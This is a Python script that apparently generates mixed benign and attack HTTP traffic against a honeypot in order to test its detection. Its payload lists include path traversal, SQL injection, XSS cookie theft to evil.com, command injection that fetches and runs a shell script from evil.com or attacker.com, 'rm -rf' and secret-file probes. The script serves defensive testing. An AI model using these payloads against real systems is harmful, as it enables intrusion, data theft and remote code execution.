import os
import random
import time
import requests

BASE_URL = os.getenv("BASE_URL", "http://webhoneypot:8081")
MODE = os.getenv("MODE", "mixed")   # normal | suspicious | mixed
COUNT = int(os.getenv("COUNT", "300"))
DELAY_MIN = float(os.getenv("DELAY_MIN", "0.3"))
DELAY_MAX = float(os.getenv("DELAY_MAX", "2.5"))

# Paths normaux qui passent le filtre is_boring_http_event()
# → ont une query, un body ou un path non-banal
NORMAL_PATHS_GET = [
    "/login?user=john",
    "/login?user=alice&redirect=/dashboard",
    "/register?ref=homepage",
    "/search?q=laptop",
    "/search?q=shoes&category=sport",
    "/search?q=wireless+keyboard&page=2",
    "/api/user/profile",
    "/api/user/profile?id=42",
    "/api/products?page=2",
    "/api/products?category=electronics&sort=price",
    "/api/orders?status=pending",
    "/api/orders?user_id=17&limit=10",
    "/dashboard",
    "/dashboard?view=monthly",
    "/profile?id=42",
    "/profile?id=88&tab=settings",
    "/upload",
    "/reset-password?token=abc123",
    "/verify?email=john@example.com",
    "/api/notifications?unread=true",
]

NORMAL_PATHS_POST = [
    "/login",
    "/register",
    "/upload",
    "/api/user/update",
    "/api/comment",
    "/api/orders/create",
    "/api/auth/refresh",
    "/contact",          # avec body → passe le filtre
    "/api/feedback",
]

NORMAL_POST_BODIES = [
    {"username": "john", "password": "pass123"},
    {"username": "alice", "password": "secret456"},
    {"email": "user@example.com", "password": "mypassword"},
    {"name": "John Doe", "email": "john@example.com", "message": "Hello"},
    {"title": "My post", "body": "Some content here", "author": "alice"},
    {"token": "eyJhbGciOiJIUzI1NiJ9.abc.def"},
    {"product_id": "42", "quantity": "2", "user_id": "17"},
    {"feedback": "Great service!", "rating": "5"},
]

MALICIOUS_PATTERNS = [
    # Path traversal
    "/../../../../etc/passwd",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    # SQLi
    "/login?user=admin'+OR+1=1--",
    "/search?id=1'+UNION+SELECT+1,2,3--",
    "/api/user?id=1+AND+SLEEP(5)--",
    # XSS
    "/search?q=<script>alert(1)</script>",
    "/comment?post=1&text=<img src=x onerror=alert(1)>",
    "/profile?name=<svg onload=alert(document.cookie)>",
    # RCE / command injection
    "/ping?ip=127.0.0.1;cat+/etc/passwd",
    "/exec?cmd=id;uname+-a",
    "/vulnerable_endpoint?param=$(whoami)",
    "/api/run?cmd=`id`",
    "/api/exec?input=;wget+http://evil.com/shell.sh",
    # Scanner / probing
    "/admin",
    "/phpmyadmin",
    "/wp-login.php",
    "/.env",
    "/server-status",
    "/actuator/env",
    "/api/v1/config",
    # Long / buffer overflow style
    "/login?user=" + "A" * 500,
    "/api?token=" + "B" * 300,
]

MALICIOUS_POST_BODIES = [
    {"username": "admin' OR '1'='1", "password": "anything"},
    {"cmd": "cat /etc/passwd"},
    {"input": "; rm -rf /tmp/*"},
    {"query": "1 UNION SELECT username,password FROM users--"},
    {"data": "<script>document.location='http://evil.com?c='+document.cookie</script>"},
    {"file": "../../../etc/shadow"},
    {"payload": "$(curl http://attacker.com/shell.sh | bash)"},
]

USER_AGENTS_NORMAL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
]

USER_AGENTS_SCANNER = [
    "sqlmap/1.8.0#stable",
    "nikto/2.5.0",
    "Nuclei - https://github.com/projectdiscovery/nuclei",
    "masscan/1.3",
    "Mozilla/5.0 zgrab/0.x",
    "python-requests/2.31.0",
    "curl/8.4.0",
    "Go-http-client/1.1",
    "WhatWeb/0.5.5",
]


def do_request():
    is_susp = (MODE == "suspicious") or (MODE == "mixed" and random.random() < 0.40)

    if not is_susp:
        # ✅ Trafic normal — GET ou POST avec contenu utile
        method = random.choices(["GET", "POST"], weights=[6, 4])[0]
        ua = random.choice(USER_AGENTS_NORMAL)
        headers = {"User-Agent": ua}

        if method == "GET":
            path = random.choice(NORMAL_PATHS_GET)
            url = BASE_URL + path
            try:
                requests.get(url, headers=headers, timeout=4)
            except Exception:
                pass

        else:  # POST
            path = random.choice(NORMAL_PATHS_POST)
            body = random.choice(NORMAL_POST_BODIES)
            url = BASE_URL + path
            try:
                requests.post(url, headers=headers, data=body, timeout=4)
            except Exception:
                pass

    else:
        # ✅ Trafic malveillant — GET ou POST uniquement (HEAD/OPTIONS retirés)
        method = random.choices(["GET", "POST"], weights=[6, 4])[0]
        ua = random.choice(USER_AGENTS_SCANNER + USER_AGENTS_NORMAL)
        headers = {
            "User-Agent": ua,
            "X-Forwarded-For": (
                f"{random.randint(1,255)}.{random.randint(0,255)}"
                f".{random.randint(0,255)}.{random.randint(1,254)}"
            ),
            "Accept-Language": "en-US,en;q=0.5" if random.random() > 0.5 else "ru-RU,ru;q=0.9"
        }

        if method == "GET":
            path = random.choice(MALICIOUS_PATTERNS)
            url = BASE_URL + path
            try:
                requests.get(url, headers=headers, timeout=4)
            except Exception:
                pass

        else:  # POST
            path = random.choice(MALICIOUS_PATTERNS + ["/login", "/upload", "/api/exec"])
            body = random.choice(MALICIOUS_POST_BODIES)
            url = BASE_URL + path
            try:
                requests.post(url, headers=headers, data=body, timeout=4)
            except Exception:
                pass


def main():
    print(f"[gen_http] mode={MODE} count={COUNT} target={BASE_URL}")
    for i in range(COUNT):
        do_request()
        delay = random.uniform(DELAY_MIN, DELAY_MAX)
        time.sleep(delay)
        if (i + 1) % 50 == 0:
            print(f"[gen_http] {i + 1}/{COUNT} requests sent")
    print(f"[gen_http] done.")


if __name__ == "__main__":
    main()